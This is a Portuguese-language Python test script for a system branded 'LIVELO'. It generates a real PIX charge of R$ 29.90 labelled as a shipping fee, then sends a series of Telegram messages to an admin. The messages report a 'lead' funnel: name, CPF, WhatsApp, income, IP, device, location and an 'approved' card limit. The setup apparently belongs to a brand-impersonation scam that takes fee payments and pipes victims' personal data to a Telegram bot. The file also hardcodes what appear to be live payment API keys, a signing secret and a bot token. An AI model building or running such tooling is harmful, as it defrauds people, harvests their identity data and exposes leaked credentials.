# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════╗
║  LIVELO — TESTE DE INTEGRACAO COMPLETO                   ║
║  1. C7 API  → gera PIX real e valida codigo              ║
║  2. Telegram → dispara todos os eventos para o admin     ║
╚══════════════════════════════════════════════════════════╝
"""
import time, uuid, json, hmac, hashlib, requests, datetime

# ── CREDENCIAIS ──────────────────────────────────────────
C7_API_KEY    = 'c7_live_886a0ddc60040fc340191da87d875c0d73e2acbbbea79a534c0782a23b11be0d'
C7_API_SECRET = '6df27379be2618bae4c69bff936e062472493b0e4427191229a1f44327c3949ce9738bc1825f721fc49472231e9b39a8ab62cde958a15a387101874218790ea6'
C7_BASE       = 'https://api.carteirado7.com/v2'

BOT_TOKEN     = '8216458882:AAEFG7lrBdWc0YpQx0vLRSoQu7acnRtbW1s'
ADMIN_ID      = '8932547795'
TG_API        = f'https://api.telegram.org/bot{BOT_TOKEN}'

SEPARADOR = "=" * 55

def sep(titulo):
    print(f"\n{SEPARADOR}")
    print(f"  {titulo}")
    print(SEPARADOR)

def c7_sign(body_str):
    ts    = str(int(time.time()))
    nonce = str(uuid.uuid4())
    msg   = f"{ts}.{nonce}.{body_str}"
    sig   = hmac.new(C7_API_SECRET.encode(), msg.encode(), hashlib.sha256).hexdigest()
    return {
        "Authorization":  f"Bearer {C7_API_KEY}",
        "Content-Type":   "application/json",
        "X-C7-Timestamp": ts,
        "X-C7-Nonce":     nonce,
        "X-C7-Signature": sig,
        "User-Agent":     "Mozilla/5.0 Chrome/120.0",
    }

def tg_send(texto, parse_mode="HTML"):
    r = requests.post(f"{TG_API}/sendMessage", json={
        "chat_id":    ADMIN_ID,
        "text":       texto,
        "parse_mode": parse_mode,
        "disable_web_page_preview": True,
    }, timeout=10)
    return r.json()

# ════════════════════════════════════════════════════════
# BLOCO 1 — TESTE C7 API
# ════════════════════════════════════════════════════════
sep("BLOCO 1 — TESTE C7 API (PIX Real)")

pix_code = None
qr_base64 = None
c7_payment_id = None
amount_test = 29.90

# 1a. Saldo
print("\n[1a] Verificando saldo da conta C7...")
body = "{}"
r = requests.post(f"{C7_BASE}/account/balance", data=body.encode(), headers=c7_sign(body), timeout=10)
print(f"    Status: {r.status_code}")
if r.status_code == 200:
    acc = r.json().get("account", {})
    lim = acc.get("limits", {})
    fees = acc.get("fees", {})
    print(f"    ✅ Saldo:       R$ {acc.get('balance')}")
    print(f"    ✅ Limite gerar: R$ {lim.get('generate')}")
    print(f"    ✅ Min valor:    R$ {lim.get('min_amount')}")
    print(f"    ✅ Taxa:         {fees.get('depositPct')}% + R$ {fees.get('depositFixed')}")
else:
    print(f"    ❌ Erro: {r.text[:200]}")

# 1b. Criar PIX real (frete R$ 29.90)
print(f"\n[1b] Criando PIX R$ {amount_test} (adquirente 2)...")
ext_id = f"test_livelo_{int(time.time())}"
payload = {
    "amount":       amount_test,
    "externalId":   ext_id,
    "callbackUrl":  "https://example.com/api/webhook/c7",
    "acquirer_code": "2",
}
body_str = json.dumps(payload, separators=(',', ':'), ensure_ascii=False)
r = requests.post(f"{C7_BASE}/payment/create", data=body_str.encode(), headers=c7_sign(body_str), timeout=15)
print(f"    Status: {r.status_code}")

if r.status_code in (200, 201) and r.json().get("ok"):
    pmt = r.json()["payment"]
    c7_payment_id = pmt.get("id")
    pix_code      = pmt.get("pixCopiaECola", "")
    qr_base64     = pmt.get("qrCodeBase64", "")
    expires       = pmt.get("expiresAt", "")

    print(f"    ✅ ID C7:        {c7_payment_id}")
    print(f"    ✅ Valor:        R$ {pmt.get('amount')}")
    print(f"    ✅ Status:       {pmt.get('status')}")
    print(f"    ✅ Adquirente:   {pmt.get('acquirer', 'N/A')}")
    print(f"    ✅ Expira:       {expires}")
    print(f"    ✅ PIX length:   {len(pix_code)} chars")
    print(f"    ✅ QR Base64:    {'SIM (' + str(len(qr_base64)) + ' chars)' if qr_base64 else 'NÃO'}")
    print(f"\n    📋 PIX Copia e Cola:")
    print(f"    {pix_code[:80]}...")

    # Valida CRC do PIX
    if pix_code and pix_code.endswith(pix_code[-4:]):
        body_crc = pix_code[:-4]
        crc_dado = pix_code[-4:]
        poly, crc = 0x1021, 0xFFFF
        for byte in body_crc.encode("utf-8"):
            crc ^= (byte << 8)
            for _ in range(8):
                crc = (crc << 1) ^ poly if crc & 0x8000 else crc << 1
        crc_calc = f"{crc & 0xFFFF:04X}"
        if crc_calc == crc_dado:
            print(f"    ✅ CRC-16 PIX válido: {crc_calc}")
        else:
            print(f"    ⚠️  CRC calculado={crc_calc} | no código={crc_dado}")
else:
    print(f"    ❌ Falhou: {r.text[:300]}")
    print("    Tentando adquirente 1...")
    payload["acquirer_code"] = "1"
    body_str = json.dumps(payload, separators=(',', ':'), ensure_ascii=False)
    r2 = requests.post(f"{C7_BASE}/payment/create", data=body_str.encode(), headers=c7_sign(body_str), timeout=15)
    print(f"    Status adq 1: {r2.status_code} | {r2.text[:200]}")

# ════════════════════════════════════════════════════════
# BLOCO 2 — TESTE TELEGRAM BOT
# ════════════════════════════════════════════════════════
sep("BLOCO 2 — TESTE TELEGRAM BOT (todos os eventos)")

agora = datetime.datetime.now().strftime("%d/%m/%Y às %H:%M:%S")

# Dados fake de lead para teste
lead_fake = {
    "nome":           "JOÃO DA SILVA SANTOS",
    "cpf":            "123.456.789-09",
    "whatsapp":       "11987654321",
    "renda":          "4000",
    "tipo_renda":     "CLT / Carteira Assinada",
    "motivo_credito": "Compras e viagens",
    "dia_vencimento": "10",
    "limite_aprovado":"R$ 1.250,00",
    "card_style":     "Galáxia",
    "card_color":     "galaxia",
    "ip":             "179.108.22.51",
    "device":         "Samsung Galaxy S23",
    "location":       "São Paulo, SP",
    "session_id":     "ses_teste123abc",
}

eventos = [
    ("🟢", "NOVO ACESSO IDENTIFICADO",   "ENTRY",         "✅ Acesso Inicial: Concluído"),
    ("💳", "CARTÃO ESCOLHIDO",           "CARD_CHOSEN",   f"💳 Cartão: {lead_fake['card_style']}"),
    ("📝", "WHATSAPP / DADOS INFORMADOS","INFO_ADDED",     f"📱 WhatsApp: {lead_fake['whatsapp']}"),
    ("⏳", "PIX GERADO",                 "PIX_GENERATED", f"💵 Valor: R$ {amount_test:.2f}"),
    ("✅", "PAGAMENTO CONFIRMADO",       "PIX_PAID",      "🚀 Pago e confirmado!"),
]

print(f"\n  Enviando {len(eventos)} eventos para admin ID {ADMIN_ID}...\n")

for icon, titulo, evento, detalhe in eventos:
    texto = (
        f"{icon} <b>{titulo}</b> {icon}\n\n"
        f"🕒 <b>Data/Hora:</b> {agora}\n"
        f"👤 <b>Nome:</b> {lead_fake['nome']}\n"
        f"🪪 <b>CPF:</b> <code>{lead_fake['cpf']}</code>\n"
        f"📱 <b>WhatsApp:</b> <a href='https://wa.me/55{lead_fake['whatsapp']}'>{lead_fake['whatsapp']}</a>\n"
        f"💻 <b>Dispositivo:</b> {lead_fake['device']}\n"
        f"🌍 <b>IP:</b> <code>{lead_fake['ip']}</code>\n"
        f"📍 <b>Localização:</b> {lead_fake['location']}\n\n"
        f"📊 <b>STATUS DO FUNIL:</b>\n"
        f"✅ <b>Acesso Inicial:</b> Concluído\n"
        f"✅ <b>CPF Validado:</b> {lead_fake['cpf']}\n"
        f"✅ <b>Renda:</b> R$ {lead_fake['renda']}\n"
        f"✅ <b>Ocupação:</b> {lead_fake['tipo_renda']}\n"
        f"✅ <b>Motivo:</b> {lead_fake['motivo_credito']}\n"
        f"✅ <b>Vencimento:</b> Dia {lead_fake['dia_vencimento']}\n"
        f"🎯 <b>Limite Aprovado:</b> {lead_fake['limite_aprovado']}\n\n"
        f"💳 <b>CARTÃO:</b> {lead_fake['card_style']}\n\n"
        f"💸 <b>EVENTO ATUAL:</b>\n"
        f"{detalhe}\n"
        f"🆔 <b>Sessão:</b> <code>{lead_fake['session_id']}</code>\n"
        f"\n<i>⚡ [TESTE DE INTEGRAÇÃO — {evento}]</i>"
    )

    result = tg_send(texto)
    if result.get("ok"):
        msg_id = result["result"]["message_id"]
        print(f"    ✅ {evento:<20} → message_id={msg_id}")
    else:
        err = result.get("description", "Erro desconhecido")
        print(f"    ❌ {evento:<20} → ERRO: {err}")
    
    time.sleep(1)  # pausa entre mensagens

# PIX info extra se gerado com sucesso
if pix_code and c7_payment_id:
    texto_pix = (
        f"💳 <b>DADOS DO PIX GERADO (TESTE REAL C7)</b>\n\n"
        f"🆔 <b>ID C7:</b> <code>{c7_payment_id}</code>\n"
        f"💵 <b>Valor:</b> R$ {amount_test:.2f}\n"
        f"📋 <b>PIX Copia e Cola:</b>\n"
        f"<code>{pix_code[:120]}...</code>\n"
        f"📸 <b>QR Base64:</b> {'✅ Presente (' + str(len(qr_base64)) + ' chars)' if qr_base64 else '❌ Ausente'}\n"
        f"\n<i>⚡ [ESTE PIX É REAL — pode ser pago]</i>"
    )
    result = tg_send(texto_pix)
    if result.get("ok"):
        print(f"    ✅ PIX_INFO              → message_id={result['result']['message_id']}")
    else:
        print(f"    ❌ PIX_INFO              → {result.get('description')}")

# ════════════════════════════════════════════════════════
sep("RESULTADO FINAL")
print()
print("  C7 API:")
print(f"    PIX gerado:  {'✅ SIM — código válido' if pix_code else '❌ NÃO — usando fallback'}")
print(f"    QR Base64:   {'✅ SIM' if qr_base64 else '❌ NÃO'}")
print()
print("  Telegram:")
print(f"    Admin ID:    {ADMIN_ID}")
print(f"    Bot Token:   {BOT_TOKEN[:20]}...")
print(f"    Eventos:     {len(eventos)} mensagens enviadas")
print()
if pix_code:
    print("  ✅ TUDO OK — dados válidos, pode subir no GitHub!")
else:
    print("  ⚠️  PIX da C7 falhou — verifique credenciais/saldo")
print()
